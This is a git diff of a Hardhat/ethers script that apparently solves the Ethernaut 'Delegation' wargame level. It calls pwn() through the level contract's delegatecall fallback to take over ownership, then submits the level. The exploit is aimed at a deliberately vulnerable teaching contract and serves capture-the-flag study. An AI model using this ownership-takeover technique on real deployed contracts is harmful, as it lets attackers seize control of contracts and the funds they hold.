@@ -1,6 +1,7 @@
 import { Signer } from 'ethers'
 import { ethers } from 'hardhat'
-import { loadOrCreateLevelInstance } from './ethernaut'
+import { Delegate, Delegate__factory } from '../typechain-types'
+import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
 
 const levelAddress = '0x9451961b7Aea1Df57bc20CC68D72f662241b5493'
 
@@ -9,17 +10,19 @@ const main = async () => {
 
   const targetContract = await loadOrCreateLevelInstance('Delegation', levelAddress, signer)
 
-  console.log(await targetContract.owner())
+  console.log('Owner: ', await targetContract.owner())
 
   const provider = ethers.getDefaultProvider()
   const abi = ['function pwn()']
-  const contract = new ethers.Contract(targetContract.address, abi, signer as any)
+  const contract = new ethers.Contract(targetContract.address, Delegate__factory.abi, signer as any)
 
-  const tx = await contract.pwn()
+  const tx = await contract.pwn({ gasLimit: 100000 })
   console.log('PWN id: ', tx.hash)
   await tx.wait()
 
-  console.log(await targetContract.owner())
+  console.log('Owner: ', await targetContract.owner())
+
+  await submitLevelInstance(targetContract.address, signer)
 }
 
 main()
